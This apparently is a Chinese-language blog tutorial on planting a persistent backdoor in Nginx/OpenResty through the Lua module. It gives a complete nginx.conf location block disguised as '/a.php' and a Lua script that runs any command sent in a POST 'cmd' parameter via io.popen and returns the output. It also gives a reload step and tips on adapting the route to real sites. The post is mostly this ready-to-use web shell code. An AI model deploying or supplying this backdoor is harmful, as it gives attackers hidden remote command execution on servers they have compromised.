---
layout: post
title: Nginx Lua Backdoor  
tags: [lua文章]
categories: [topic]
---
在先知看到了apache利用lua留后门，就想着用nginx也试试

安装有ngx_lua模块，在openresty和tengine中是默认安装了ngx_lua模块的。

我这里拿openresty举例，你可以在这里[下载win平台](https://openresty.org/download/openresty-1.15.8.1-win64.zip)打包好的。

# 步骤

找到conf/nginx.conf，在server块中添加路由

    
    
    1
    2
    3
    4
    

|

    
    
    location = /a.php {  
        default_type 'text/plain';  
        content_by_lua_file lua/backdoor.lua;
    }  
  
---|---  
  
然后创建`lua/backdoor.lua`脚本，你也可以创建在任意位置，不过要对应上文的`content_by_lua_file`字段

    
    
    1
    2
    3
    4
    5
    6
    7
    8
    

|

    
    
    ngx.req.read_body()
    local post_args = ngx.req.get_post_args()
    local cmd = post_args["cmd"]
    if cmd then
        f_ret = io.popen(cmd)
        local ret = f_ret:read("*a")
        ngx.say(string.format("%s", ret))
    end  
  
---|---  
  
重载nginx

    
    
    1
    

|

    
    
    nginx -s reload  
  
---|---  
  
浏览器访问

![20190901174819](https://y4er.com/img/uploads/20190901174819.png)

# 文后

在实际的环境中，conf文件并不固定，你需要针对不同站点的配置文件去修改。

而location你可以更灵活一些，毕竟他能用正则表达式�，具体怎么用看你自己咯。

参考链接

  1. <https://github.com/netxfly/nginx_lua_security>
  2. <https://xz.aliyun.com/t/6088>

 **文笔垃圾，措辞轻浮，内容浅显，操作生疏。不足之处欢迎大师傅们指点和纠正，感激不尽。**